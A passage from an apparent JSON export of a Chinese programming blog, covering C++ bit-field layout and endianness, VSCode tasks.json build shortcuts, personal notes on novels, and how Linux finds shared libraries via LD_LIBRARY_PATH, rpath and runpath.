std::hex \u0026lt;\u0026lt; static_cast\u0026lt;uint16_t\u0026gt;(ele); } return 0; } /**output Using reinterpret_cast: cdef90ab56781234 Using memcpy: 34127856ab90efcd */ memcpy 将 bit-field 结构体的内存直接拷到 vector 中，然后我们逐字节地输出；可以看到， Foo 结构的内存首先遵循 3.1小节 的规则， Foo::a 在低地址，其次，每个成员被赋的值也按照小端序在存储。\n不妨再用GDB验证我们的发现：\ngdb print \u0026amp;foo 3.3 再看Demo 我们搞清了 bit-field 内存结构的两个原则，再来看看 cppreference 提供的Demo：\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;cstdint\u0026gt; #include \u0026lt;bit\u0026gt; struct S { // will usually occupy 2 bytes: unsigned char b1 : 3; // 1st 3 bits (in 1st byte) are b1 unsigned char : 2; // next 2 bits (in 1st byte) are blocked out as unused unsigned char b2 : 6; // 6 bits for b2 - doesn\u0026#39;t fit into the 1st byte =\u0026gt; starts a 2nd unsigned char b3 : 2; // 2 bits for b3 - next (and final) bits in the 2nd byte }; int main() { std::cout \u0026lt;\u0026lt; sizeof(S) \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; // usually prints 2 S s; // set distinguishable field values s.b1 = 0b111; s.b2 = 0b101111; s.b3 = 0b11; // show layout of fields in S auto i = std::bit_cast\u0026lt;std::uint16_t\u0026gt;(s); // usually prints 1110000011110111 // breakdown is: \\_/\\/\\_/\\____/\\/ // b1 u a b2 b3 // where \u0026#34;u\u0026#34; marks the unused :2 specified in the struct, and // \u0026#34;a\u0026#34; marks compiler-added padding to byte-align the next field. // Byte-alignment is happening because b2\u0026#39;s type is declared unsigned char; // if b2 were declared uint16_t there would be no \u0026#34;a\u0026#34;, b2 would abut \u0026#34;u\u0026#34;. for (auto b=i; b; b\u0026gt;\u0026gt;=1) // print LSB-first std::cout \u0026lt;\u0026lt; (b \u0026amp; 1); std::cout \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } 2\n1110000011110111\n这个例子在我最初和同事一块研究的时候，搞得我们云里雾里的，完全不知道这里的输出是怎么回事，实际上万变不离其宗，只消考虑：\n先定义的成员在低地址，因此变量 s 的内存结构就是 s.b1 ~ s.b2 ~ s.b3\n成员的值也遵循小端序，因此对于 s.b2 = 0b101111 ，它的内存从低到高的比特位其实是反过来的 111101\nbit-field 有 匿名成员 和 内存对齐 等机制，由于比较易懂不在本文介绍的重点里，简单理解为使用 0 来填充一些比特位，使整个结构的大小符合内存分配的规律（如 4 字节的倍数这样的）\n这三点结合起来，可以解释Demo里的 注释 。\n对Demo的输出的理解则又要多绕一个弯：这里的 for 循环实际上是 从低位到高位 打印 i 这个变量，这个变量又是 std::bit_cast\u0026lt;uint16_t\u0026gt;(s) 得到的，因此，虽然 i 的内存结构跟 s 是一样的，但它的数值，已经按照小端序的规则转化过了。现在， i 的 低位 实际上是内存的 低地址 ，循环从 低位到高位 打出来的就是内存的 低地址到高地址 ，也就是我们看到的，注释里面的 s 的内存结构。\n4 番外 本章摘录一些 bit-field 的其他特性 4 ：\n匿名成员，只定义长度但不提供名字，通常用于把比特位拉齐到 8 到整数倍，在 3.3节 中的Demo里有；\n不能 对 bit-field 成员取地址，编译会失败，原因很容易理解：成员在内存中可能是 跨字节 的，因此指针没办法定位到这样的成员身上；\n对 bit-field 成员赋超出表示范围的值，最终的结果要看编译器的实现（一般是类似整数截断的行为）；\nbit-field 也可以放到类里，也可以定义 public 接口对 bit-field 成员进行操作：\nclass Foo { public: Foo(uint16_t rhsa, uint16_t rhsb) : a(rhsa), b(rhsb) {} uint16_t GetA() { return static_cast\u0026lt;uint16_t\u0026gt;(a); } uint16_t GetB() { return static_cast\u0026lt;uint16_t\u0026gt;(b); } uint32_t GetC() { return c;} private: uint16_t a : 5; uint16_t b : 8; uint32_t c{0xDEADBEEF}; // common member }; template\u0026lt;typename T, std::enable_if_t\u0026lt;std::is_unsigned_v\u0026lt;T\u0026gt;, bool\u0026gt; = true\u0026gt; void LOGX(T val) { std::cout \u0026lt;\u0026lt; std::setfill(\u0026#39;0\u0026#39;) \u0026lt;\u0026lt; std::setw(2) \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; val \u0026lt;\u0026lt; std::endl; } template\u0026lt;typename T\u0026gt; void LOGX(const std::string \u0026amp;desc, T val) { std::cout \u0026lt;\u0026lt; desc; LOGX(std::forward\u0026lt;T\u0026gt;(val)); } int main() { std::cout \u0026lt;\u0026lt; \u0026#34;sizeof Foo: \u0026#34; \u0026lt;\u0026lt; sizeof(Foo) \u0026lt;\u0026lt; std::endl; // 内存对齐 Foo foo(0xFF, 0xAB); LOGX(\u0026#34;foo.a: \u0026#34;, foo.GetA()); // 截断 LOGX(\u0026#34;foo.b: \u0026#34;, foo.GetB()); // 正常 LOGX(\u0026#34;foo.c: \u0026#34;, foo.GetC()); // 默认构造 return 0; } /**output sizeof Foo: 8 foo.a: 1f foo.b: ab foo.c: deadbeef */ 感悟 写完本文不禁感叹，由于字节序的存在，使得要想在实际生产中快速地引入 bit-field 是很难的，对于两三个成员的结构来说尚可以把握，成员一多，每个成员的字节序、每个成员的值的字节序，就成为了令人头痛却又不得不考虑的一个东西了。无怪乎我虽浅看过一些C/C++编程的材料，却直到大佬亲自指点方知有此特性的存在。\n假如只是为了缩减结构体所占的内存，且结构体本身又没有特殊的转为数值的诉求，那么使用 bit-field 这样的底层特性是合适的；而假如像本文所说的，总是希望对 bit-field 所在的那块内存进行一些转换，则这个机制的底层原理实在很容易把人绕进去，倒不如乖乖使用虽丑却香的整数位运算去也。\n参考资料 Bit-field, cppreference, https://en.cppreference.com/w/cpp/language/bit_field\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nstd::bit_cast, cppreference, https://en.cppreference.com/w/cpp/numeric/bit_cast\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n理解字节序, 阮一峰, https://www.ruanyifeng.com/blog/2016/11/byte-order.html\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nBit Fields in C, GeeksforGeeks, https://www.geeksforgeeks.org/bit-fields-c/\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2023-08-27T00:00:00Z","permalink":"https://xrg.fj.cn/p/c-%E4%BD%8D%E5%9F%9Fbit-field%E7%AE%80%E4%BB%8B/","title":"C++位域（bit-field）简介"},{"content":"近来与VSCode打交道颇多，偶然认识了其 Tasks 特性，很觉得对效率提升大有裨益，浅做一记，以备后用。\n所谓 Tasks ，实际上就是一组快捷命令的组合，将我们常用的操作整理为一个集合，一键式执行，可以极大地减少手动的命令输入和记忆成本。\n在VSCode工作区根目录 .vscode 文件夹下创建 tasks.json 文件，写入第一个快捷指令：\ntasks.json file location { // See https://go.microsoft.com/fwlink/?LinkId=733558 // for the documentation about the tasks.json format \u0026#34;version\u0026#34;: \u0026#34;2.0.0\u0026#34;, \u0026#34;tasks\u0026#34;: [ { \u0026#34;label\u0026#34;: \u0026#34;Run tests\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;shell\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;echo \u0026#39;Hello world\u0026#39;\u0026#34;, \u0026#34;group\u0026#34;: \u0026#34;test\u0026#34;, \u0026#34;presentation\u0026#34;: { \u0026#34;reveal\u0026#34;: \u0026#34;always\u0026#34;, \u0026#34;panel\u0026#34;: \u0026#34;new\u0026#34; } } ] } 从菜单栏【Terminal】\u0026ndash;【Run task】手动打开任务栏（或自己绑定快捷键）：\nrun task 运行！\ntask result 实际场景：一键编译 见到了SHELL语句的自动执行后，很容易就能在实际生产中用上这个特性，毕竟，SHELL语句本身是支持分隔符的（ ; ），即使对 Tasks 的高端用法没什么了解，直接把一堆命令拼到一起，把 task 当快捷键用，也足以覆盖很多的生产场景了。\n例如，我打开了一个小项目，其中只有一份源文件和一份CMake文件，希望在这个项目根目录下创建一个 build 目录，并且自动完成 cmake 和 make ，那么我会写一个这样的 task ：\n{ // See https://go.microsoft.com/fwlink/?LinkId=733558 // for the documentation about the tasks.json format \u0026#34;version\u0026#34;: \u0026#34;2.0.0\u0026#34;, \u0026#34;tasks\u0026#34;: [ { \u0026#34;label\u0026#34;: \u0026#34;compile project\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;shell\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;mkdir -p build; cd build; rm -r ./*; cmake ..; make;\u0026#34;, \u0026#34;options\u0026#34;: { \u0026#34;cwd\u0026#34;: \u0026#34;${workspaceFolder}/exp-bit-field\u0026#34; } } ] } 它的运行效果是：\ncompile project task result 现在，我们的项目路径底下就创建好了一个 build ，并且已经完成了编译：\nfolder 这里的Demo看着比较简单，但实际上这样的命令组合在工作中是经常见到的，例如我就经常需要指定一堆环境变量并运行某个路径下的某个脚本，虽然其内容是固定的，但记忆和输入的成本实在太高，自有了 Tasks 之后，舒适度简直不知道提高了多少。\n实际场景：在task中使用外部输入 在上面的一键编译的Demo中，我们通过 options 指定了工作路径在 ${workspaceFolder} 下的 exp-bit-field 目录，因此 build 的创建、 cmake 语句的执行都以此目录为基准。\n考虑这样的场景：项目中不止一个工作目录，需要在不同目录间切换并执行类似的快速编译动作，则是否需要编写若干 task ，每个 task 对应一个目录？\n答案是否定的，我们可以利用外部输入来达到灵活指定工作目录的目的。\n在 tasks.json 中设置一个输入，指定其类型为 promptString ，设置描述和默认值，然后在 options.cwd 当中使用这个输入：\n{ // See https://go.microsoft.com/fwlink/?LinkId=733558 // for the documentation about the tasks.json format \u0026#34;version\u0026#34;: \u0026#34;2.0.0\u0026#34;, \u0026#34;inputs\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;workdir\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;promptString\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;work directory to execute compile command\u0026#34;, \u0026#34;default\u0026#34;: \u0026#34;exp-\u0026#34; } ], \u0026#34;tasks\u0026#34;: [ { \u0026#34;label\u0026#34;: \u0026#34;compile project\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;shell\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;mkdir -p build; cd build; rm -r ./*; cmake ..; make;\u0026#34;, \u0026#34;presentation\u0026#34;: { \u0026#34;reveal\u0026#34;: \u0026#34;always\u0026#34; }, \u0026#34;options\u0026#34;: { \u0026#34;cwd\u0026#34;: \u0026#34;${workspaceFolder}/${input:workdir}\u0026#34; } } ] } 现在运行任务时，会优先要求我们输入工作目录：\nworkdir is required 并在我们指定的路径下执行一系列命令：\nworkdir is used in task 小结 其实本文只是对VSCode Tasks特性进行了极浅显的介绍，但其中内容已基本覆盖了我个人工作中触及的所有场景。当下我可以自己指定需要拉取代码的分支、需要执行编译命令的本地路径，已经完美地规避了大段大段的命令记忆和输入，能够更加集中在开发工作身上。\n参考资料 [1] https://marketplace.visualstudio.com/items?itemName=augustocdias.tasks-shell-input#:~:text=Currently%2C%20VSCode%20supports%203%20types%20of%20inputs%20for,used%20as%20a%20possible%20input%20for%20your%20task.\n[2] Variables Reference, https://code.visualstudio.com/docs/editor/variables-reference\n[3] Tasks in Visual Studio Code, https://code.visualstudio.com/docs/editor/tasks\n[4] VSCode中Task的使用, https://blog.csdn.net/qq_53653262/article/details/120859147\n","date":"2023-08-27T00:00:00Z","permalink":"https://xrg.fj.cn/p/vscode-tasks%E7%AE%80%E4%BB%8B/","title":"VSCode tasks简介"},{"content":"近来的业余活动基本只剩读书。不过，读的不是什么技术、政治、哲学之流，而是我从前所不热衷的小说。\n还是要写点杂感的，否则便是白读；免得日后说到某某书名，只记得读过，却不知读到了什么，那真叫时光的浪费了。\n《Harry Potter》 我近期对小说的热衷，正是由《哈利·波特》带来的。本意只是想重温一下中学时代特别喜欢的这部作品，买到手后竟使我不知饥渴疲乏地看，其情节之紧凑，设定之动人，着实使我沉迷颇深了。周五晚上到货的七本书，到周日晚上睡前已读完了五本，本想着上班之后就又要有几天加班的日子不能读之，结果由于总是心心念念着这个动人的魔法世界，使得我几乎没有心思去延长我的工作日，而每天六点多下班回家，边吃着饭就边进入到这个奇幻的世界里了。\n这个系列最打动我的是魔法世界的完整设定，概念如此丰富新奇且无懈可击，称它为“波特宇宙”也不为过。主线中有很多动人的成人角色，这些角色在哈利波特的成长历程中各有作用，使得主角团的发展是有序的，不至于掉入“天命小屁孩救世”的俗套。\n《哈利·波特》给我的生活习惯带来了很大的改变，在早先，偶尔几日的加班于我而言并无大碍，现在则视加班如猛虎了——生活中实在应该有更精彩的事情值得做。我对小说的热忱也就在连续几日的阅读中慢慢酝酿出来，在《死亡圣器》将至尾声的时候，我就在考虑下一部要阅读的对象了。\n《三体》 买《三体》完全是因为它的名气。读完《哈利·波特》之后，总要有一些同样优秀的作品，来填补每天下班后的那段时间的空缺——我大抵已经回不到此前那种下班后就打开电脑看直播的颓废生活了。作为中国科幻作品的骄傲，《三体》的名气实在太大了，即使在我个人对科幻作品全无兴趣的前提下，也很难不由于好奇而开一次先例。\n《地球往事》和《黑暗森林》确实相当引人入胜，三体文明、智子、面壁计划、水滴、黑暗森林威慑……科幻相比于魔幻，有更多“假亦真时真亦假”的味道，《三体》宇宙的设定之完整丰富，不在哈利波特之下；设定之恢弘，则远胜之。\n《死神永生》是三体的最后一部，网上常见的“二向箔”一词，在作品里原来是太阳系的死神。三维太阳系全部掉入二维世界的片段，简直是一曲令人绝望的悲歌；借由曲率驱动飞船光速逃离太阳系的仅存的几人，终究也在时间轴上永远地分别了。\n总的说来，《三体》是一部希望与绝望交织的作品，个人并不太喜欢它的题材和总体中性偏悲的基调，但这部作品就是有这样一种神奇的力量，使得在看完它之后而回到其他小说的故事中时，觉得这些地球上、人世间、短短若干年的故事是这样的窄狭，简直像是游览了四维空间后回到了三维空间那样了。\n不过这样的感觉终究是浅浅的，毕竟，从故事世界中回到现实，这样一种由开阔到逼仄的体验，是每天都在发生的，早该习惯的。\n《基督山伯爵》 在《三体》将至尾声的时候，就如在《哈利·波特》降至尾声那样，我开始找寻下一本阅读对象。\n现在的电商书单实在是夸张的很，每本书都有若干夸张的形容词，加粗加大地跟书籍封面拼在一起，构成一幅庸俗的画面。不过不得不承认这样的营销偶有奇效，当我看到“余华三天三夜看完”、“快意恩仇”的字样，我就知道这本《基督山伯爵》我是非看不可了。\n跟出于名气而购入的《三体》不同，《基督山伯爵》的作品简介本就很符合我的胃口。主角蒙冤入狱、偶得珍宝、出狱后报恩报仇这样的套路，简直正如网上的一则书评所说是“现代爽文的鼻祖”。不得不说，大师究竟是大师，无论是人物的言语、对话，情节的起承转合，都是普通爽文作者所不能望其项背的；我买到的周克希版本的译作也非常出色，总觉得翻译后的人物对话有一种京片子的味道，不过未及考证。\n基督山最终没和梅塞苔丝在一起，大大违背了我的愿望，不过梅塞苔丝作为一个有神性的女角色，遭遇了悲惨的婚姻之后也确实再难幸福。故事虽说是复仇主题，但在神性笼罩下的人性处处可见，复仇的尺度拿捏得十分到位，少之则读者不快，过之则使人反感了。仔细想来，中学时极爱、大学时重温的金庸的《连城诀》，故事竟几乎复刻了基督山的走向，蒙冤入狱、偶得神功、报恩报仇，由此可见我对《基督山伯爵》的喜爱的种子，早已在冥冥中由它的一部中国版本埋下了。\n《白夜行》 昨天才读完的《白夜行》，是在挚友的推荐下加入的书单，不出所料，是一部极悲的悲剧，我看完之后简直恨不得顺着网线去把他揍一顿，方解心头之积郁。\n唐泽雪穗是悲剧的女主角，小时候的悲惨遭遇使她此生永无光明，行于白天，有如黑夜。桐原亮司是雪穗的太阳，在刺杀了生父、救了雪穗之后，亮司的人生就陷入一个接一个的犯罪活动中。亮司的一切都是为了雪穗，他也正如太阳那样，燃烧着自己，试图去照亮一个身处茫茫宇宙中的女人。写此杂感时忽然想到，《白夜行》的悲，固然有角色命运的悲、无辜者的死去的悲，最终又何尝不像《三体》那样，是一个星系的覆灭的悲呢，只不过这个星系，只由两个可怜的、夜里的人组成了。\n昨晚读完此书，跟挚友大放情怀。我说我的生活中已经有很多的阴霾了，不希望在小说世界里也重复感受这种惨惨戚戚的气氛；我实在觉得悲剧是写给有闲阶级看的，只有什么都不缺、餍足了肥甘的那样一些人，才会需要一些辛辣、咸酸的东西开胃，才会总要把什么美好的东西拿来毁灭给人看。工人阶级的基调呢，总体则是昂扬向上的，这个阶级被真切地毁灭了的美好实在太多了，在小说中不需要再毁灭什么来加重这样的情状了。\n","date":"2023-06-24T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E8%AF%BB%E4%B9%A6%E6%9D%82%E6%84%9F/","title":"读书杂感"},{"content":"0 动态链接概要 相信点开本文的读者朋友们知道， 模块化编程 是开发过程中的一个重要概念，其思想大致是将程序中的 功能上独立且可复用 的代码块封装为一个个模块，基于这些功能模块构建出一个完整的可执行程序。\n库（libraries） 是实现模块化编程的重要基础。一个库就相当于是一个独立的模块，库的开发者将一系列功能封装成一个单元，开发人员可以在不同的库中找到不同的功能实现，以此简化代码并避免重复造轮子。\n在Linux中，库分为 静态库（static libraries） 和 动态库（dynamic libraries） ，前者是在 编译时 将库整合进可执行程序中，后者是在 运行时 才找到对应的库并加载执行。\nLinux库层次（图源参考资料[1]） 静态库对应的静态链接发生在编译期间，这意味着在可执行程序中包含了主程序依赖的所有静态库。这样做的好处是对于一些小的功能模块可以省去动态链接所需的时间开销；坏处是静态库不可共用，假如有多个可执行程序使用了同一个静态库，那么磁盘和内存中就会有多个静态库副本。\n动态库在我看来是更加优雅的模块化方式。其对应的 动态链接 发生在程序运行期间，当需要某一个功能函数时，系统自动查找提供这个功能的动态库并将其加载到内存中。其好处是不同的可执行程序依赖同一个动态库提供的功能时，只要内存中已经有了这个动态库就不需要重新加载，完美诠释了模块化+可复用的理念；坏处是动态链接一定程度上增加了运行耗时，且动态链接机制本身会使得错误的发现延后——编译时零告警零报错，等到运行时才发现跑挂了——这是很可能的事。\n静态库和动态库的对比（图源参考资料[1]） 既然动态链接是程序在运行期间才发生的事情，那么系统将回答如下的问题：\n要怎么知道这个程序需要哪些库？\n怎么找到对应的库？\n1 动态链接库的指定 对于第一个问题——要怎么知道这个程序需要哪些库——答案很简单：在编译的时候告诉系统。因此动态链接也不完全是在运行时才发生的事～至少在编译期间，我们会告诉编译器这个程序要链接哪些库，编译器在发现某些主程序没有实现的函数（符号）的时候，会到这些动态库里去找，假如在某个库里找到了这个函数，会在最终的可执行程序里标记出来，告诉系统在调用这个函数的时候动态加载一下所需的库。\n文字描述过于抽象，举个例子。\n假设我们实现了一个库，用来获取一个 [-100, 100] 之间的随机数，我们提供一个头文件供别人调用：\n// get_random.h #ifndef GET_RANDOM_H #define GET_RANDOM_H int GetRandom(); #endif 然后实现它：\n#include \u0026lt;random\u0026gt; #include \u0026#34;get_random.h\u0026#34; int GetRandom() { std::random_device rd; std::mt19937 mt(rd()); std::uniform_real_distribution\u0026lt;double\u0026gt; dist(-100, 100); return static_cast\u0026lt;int\u0026gt;(dist(mt)); } 并编译出一个动态库：\n$ g++ get_random.cpp -fPIC -shared -o libgetrd.so # -fPIC 生成与位置无关的代码，全部使用相对地址，才能进行动态加载 # -shared 生成共享库 # -o 编译产生的目标文件 我们得到了 libgetrd.so 文件，它是一个共享对象（ .so ，shared object），所有程序都可以链接它。现在有个主程序要打印一个随机数，它打算借助 GetRandom() 来获取随机数：\n// main.cpp #include \u0026lt;iostream\u0026gt; #include \u0026#34;get_random.h\u0026#34; int main() { std::cout \u0026lt;\u0026lt; \u0026#34;Random: \u0026#34; \u0026lt;\u0026lt; GetRandom() \u0026lt;\u0026lt; std::endl; return 0; } 如果我们在编译的时候不告诉编译器 GetRandom() 来自于一个动态库，那么编译器就由于找不到这个函数的定义而报错：\n$ g++ main.cpp -o main /tmp/ccVJh4oD.o: In function `main\u0026#39;: main.cpp:(.text+0x1c): undefined reference to `GetRandom()\u0026#39; collect2: error: ld returned 1 exit status 而只要把动态库的信息告诉编译器，情况就大为好转：\n$ g++ main.cpp -L. -lgetrd -o main # 编译通过 # -L 动态库的搜索路径 # -l 依赖的动态库，动态库的标准命名是 libxxx.so ，编译时指定 xxx 即可 编译出可执行程序 main 的历程如下：\n编译源文件 main.cpp ｜ ｜ 发现一个函数 GetRandom() ｜ ｜ main.cpp 当中没有定义这个函数 ｜ ｜ 看看依赖的动态库 libgetrd.so 里有没有定义这个函数 ｜ ｜ 找到函数定义，标记到可执行程序中，告诉系统运行到 GetRandom() 时加载 libgetrd.so 假如说 main.cpp 自己定义了 GetRandom() ，又想去链接 libgetrd.so ，情况会变成什么样子呢？\n// main.cpp #include \u0026lt;iostream\u0026gt; #include \u0026#34;get_random.h\u0026#34; int GetRandom() // fake GetRandom() { return 1; } int main() { std::cout \u0026lt;\u0026lt; \u0026#34;Random: \u0026#34; \u0026lt;\u0026lt; GetRandom() \u0026lt;\u0026lt; std::endl; return 0; } $ g++ main.cpp -L. -lgetrd -o main # 编译通过 # 搞一些小手段让 main 可以运行（详见第2章） $ ./main Random: 1 $ ./main Random: 1 $ ./main Random: 1 可以看到，主程序自己定义的 GetRandom() 把动态库里的 GetRandom() 隐藏掉了，真正运行的时候使用的是主程序里的 GetRandom() 。\n有些富有经验的小伙伴就惊呆了，怎么好像以前编译项目的时候不是这个情况呀？或许你想到的是这个错误：\n$ g++ main.cpp get_random.cpp -o main /tmp/ccq8KOON.o: In function `GetRandom()\u0026#39;: get_random.cpp:(.text+0x0): multiple definition of `GetRandom()\u0026#39; /tmp/ccHVl0yK.o:main.cpp:(.text+0x0): first defined here collect2: error: ld returned 1 exit status 显然：动态链接时查找符号的机制比较宽松，出现同名函数时不会报重复定义的错误，只是在运行时会出现函数被隐藏的情况；但如果想把多个源文件编在一个二进制程序中，就不能出现函数的重复定义。\n多个动态库分别实现了同名的函数时，情况也差不多，最先被链接的那个动态库里的函数会得到执行，这里就不做演示了。\n2 动态链接库的找到 程序运行过程中，系统怎么知道要去哪里找这个程序依赖的动态库呢？我们编译时通过 -L 和 -l 参数告诉编译器的信息，有被记录到可执行程序中吗？\n2.1 编译时动态库路径 答案是没有。编译时通过 -l 告诉编译器我们需要什么库，通过 -L 告诉编译器去哪里找这个库，当编译器完成编译之后，会将 -l 提供的库信息写到可执行程序里，但会立刻将 -L 提供的路径信息抛诸脑后。\n我们重新编译一下 main ，并尝试运行它：\n$ g++ main.cpp -L. -lgetrd -o main $ ./main ./main: error while loading shared libraries: libgetrd.so: cannot open shared object file: No such file or directory 这次，编译通过之后直接运行 main ，但得到了一个错误信息，告诉我们找不到 libgetrd.so 。\n显然，编译时通过 -L 指定的搜索路径在运行时就失效了，这个信息并没有被写入可执行程序中。\nLinux为我们提供了一个很不错的工具： ldd ，它可以查看一个可执行程序依赖的所有动态库，并按照动态库的搜索规则来尝试找到这些动态库的位置。我们尝试通过这个工具查看 main 依赖的动态库：\n$ ldd main linux-vdso.so.1 =\u0026gt; (0x00007ffee10d1000) libgetrd.so =\u0026gt; not found libstdc++.so.6 =\u0026gt; /lib64/libstdc++.so.6 (0x00007fdf4bf46000) libm.so.6 =\u0026gt; /lib64/libm.so.6 (0x00007fdf4bc44000) libgcc_s.so.1 =\u0026gt; /lib64/libgcc_s.so.1 (0x00007fdf4ba2e000) libc.so.6 =\u0026gt; /lib64/libc.so.6 (0x00007fdf4b660000) /lib64/ld-linux-x86-64.so.2 (0x00007fdf4c24e000) 可见，按照默认的规则来看，我们编译出的 main 所依赖的 libgetrd.so 确实无法被正确加载。\n2.2 LD_LIBRARY_PATH 大部分小伙伴对 LD_LIBRARY_PATH 还是比较熟悉的，这个环境变量通常用于指定 系统默认路径之外 的动态库搜索路径。\n以我们的 libgetrd.so 为例，我们可以通过在 LD_LIBRARY_PATH 当中加上这个库所在的路径，来让我们的主程序在运行过程中能找到这个库。\n$ echo $LD_LIBRARY_PATH /opt/rh/devtoolset-8/root/usr/lib64:/opt/rh/devtoolset-8/root/usr/lib:/opt/rh/devtoolset-8/root/usr/lib64/dyninst:/opt/rh/devtoolset-8/root/usr/lib/dyninst:/opt/rh/devtoolset-8/root/usr/lib64:/opt/rh/devtoolset-8/root/usr/lib # 把当前路径加到动态库搜索路径 $ export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:`pwd` # 注意最后一项 $ echo $LD_LIBRARY_PATH /opt/rh/devtoolset-8/root/usr/lib64:/opt/rh/devtoolset-8/root/usr/lib:/opt/rh/devtoolset-8/root/usr/lib64/dyninst:/opt/rh/devtoolset-8/root/usr/lib/dyninst:/opt/rh/devtoolset-8/root/usr/lib64:/opt/rh/devtoolset-8/root/usr/lib:/home/dg/exp # 注意 libgetrd.so 的路径 $ ldd main linux-vdso.so.1 =\u0026gt; (0x00007ffc90d28000) libgetrd.so =\u0026gt; /home/dg/exp/libgetrd.so (0x00007f51448ce000) libstdc++.so.6 =\u0026gt; /lib64/libstdc++.so.6 (0x00007f51445c6000) libm.so.6 =\u0026gt; /lib64/libm.so.6 (0x00007f51442c4000) libgcc_s.so.1 =\u0026gt; /lib64/libgcc_s.so.1 (0x00007f51440ae000) libc.so.6 =\u0026gt; /lib64/libc.so.6 (0x00007f5143ce0000) /lib64/ld-linux-x86-64.so.2 (0x00007f5144ad2000) 2.3 rpath和runpath 除了 LD_LIBRARY_PATH 之外，是否还有其他指定动态库查找路径的方法呢？试想，我们需要发布一个程序，并将程序所需的所有动态库都放在我们指定的某个特定路径下，由于我们指定的路径不属于系统默认的动态库路径，难道只能委屈用户在使用我们的程序之前自己去指定 LD_LIBRARY_PATH 吗？这也太不友好了～\n2.3.1 rpath 事实上，就像我们可以指定编译时的动态库路径那样，我们也可以指定运行时的动态库路径，这个路径信息会被写入到编译出来的可执行文件中。通过编译参数 -Wl 表示将后面的信息传递给 链接器 ，通过 -rpath,[path] 来告诉链接器将动态库的搜索路径写入到可执行文件中。\n$ g++ main.cpp -L. -lgetrd -Wl,-rpath,./ -o main 动态库的信息记录在可执行文件的动态段里，我们可以通过 readelf 工具，并指定 -d 选项来查看 main 程序的动态段。\n$ readelf -d main Dynamic section at offset 0xdd8 contains 29 entries: Tag Type Name/Value 0x0000000000000001 (NEEDED) Shared library: [libgetrd.so] 0x0000000000000001 (NEEDED) Shared library: [libstdc++.so.6] 0x0000000000000001 (NEEDED) Shared library: [libm.so.6] 0x0000000000000001 (NEEDED) Shared library: [libgcc_s.so.1] 0x0000000000000001 (NEEDED) Shared library: [libc.so.6] 0x000000000000000f (RPATH) Library rpath: [./] # ====== 以下省略若干行 ====== 可以看到，动态段首先记录了这个程序运行所需要的所有动态库，这和我们前文提及的一致；在上面列出的最后一行中，还记录了一个 RPATH 字段，这个字段提供了程序运行时可以查找的动态库路径。\nldd 也是没有问题的：\n$ ldd main linux-vdso.so.1 =\u0026gt; (0x00007ffc90d28000) libgetrd.so =\u0026gt; /home/dg/exp/libgetrd.so (0x00007f51448ce000) libstdc++.so.6 =\u0026gt; /lib64/libstdc++.so.6 (0x00007f51445c6000) libm.so.6 =\u0026gt; /lib64/libm.so.6 (0x00007f51442c4000) libgcc_s.so.1 =\u0026gt; /lib64/libgcc_s.so.1 (0x00007f51440ae000) libc.so.6 =\u0026gt; /lib64/libc.so.6 (0x00007f5143ce0000) /lib64/ld-linux-x86-64.so.2 (0x00007f5144ad2000) 2.3.2 runpath 使用与 RPATH 类似的编译命令，但额外添加一个标记 --enable-new-dtags 来指定使用 runpath ：\n$ g++ main.cpp -L. -lgetrd -Wl,-rpath,./,--enable-new-dtags -o main $ readelf -d main Dynamic section at offset 0xdd8 contains 29 entries: Tag Type Name/Value 0x0000000000000001 (NEEDED) Shared library: [libgetrd.so] 0x0000000000000001 (NEEDED) Shared library: [libstdc++.so.6] 0x0000000000000001 (NEEDED) Shared library: [libm.so.6] 0x0000000000000001 (NEEDED) Shared library: [libgcc_s.so.1] 0x0000000000000001 (NEEDED) Shared library: [libc.so.6] 0x000000000000001d (RUNPATH) Library runpath: [./] # ====== 以下省略若干行 ====== readelf 的输出跟前面看到的基本一致，但得益于 --enable-new-dtags 标记，最后一行的 rpath 标记变为了 runpath 。\n至此，我们产生了很大的疑问： LD_LIBRARY_PATH 、 rpath 和 runpath 都用于指定动态链接库的搜索路径，为什么需要有这么多的机制呢？尤其是 rpath 和 runpath ，同作为可执行文件动态段的一个成员，它们的区别在什么地方呢？\n2.4 动态链接库查找规则 2.4.1 查找规则 不必多言，直接摘录 ld.so官方文档 ：\nIf a shared object dependency does not contain a slash, then it is searched for in the following order: o Using the directories specified in the DT_RPATH dynamic section attribute of the binary if present and DT_RUNPATH attribute does not exist. Use of DT_RPATH is deprecated. o Using the environment variable LD_LIBRARY_PATH, unless the executable is being run in secure-execution mode (see below), in which case this variable is ignored. o Using the directories specified in the DT_RUNPATH dynamic section attribute of the binary if present. Such directories are searched only to find those objects required by DT_NEEDED (direct dependencies) entries and do not apply to those objects\u0026#39; children, which must themselves have their own DT_RUNPATH entries. This is unlike DT_RPATH, which is applied to searches for all children in the dependency tree. o From the cache file /etc/ld.so.cache, which contains a compiled list of candidate shared objects previously found in the augmented library path. If, however, the binary was linked with the -z nodeflib linker option, shared objects in the default paths are skipped. Shared objects installed in hardware capability directories (see below) are preferred to other shared objects. o In the default path /lib, and then /usr/lib. (On some 64-bit architectures, the default paths for 64-bit shared objects are /lib64, and then /usr/lib64.) If the binary was linked with the -z nodeflib linker option, this step is skipped. 简言之，链接器在查找程序依赖的动态库时，搜索的顺序是：\nRPATH\nLD_LIBRARY_PATH\nRUN_PATH\n/etc/ld.so.cache 文件中记载的动态链接库路径缓存\n系统默认搜索路径 /lib 和 /use/lib （ 64 位的动态库默认是 /lib64 和 /usr/lib64 ）\n这个查找规则，也解释了为什么既需要 RPATH 又需要 RUNPATH 。实际上，在历史中早先只有 RPATH ，但由于 RPATH 设置的路径优先级高于 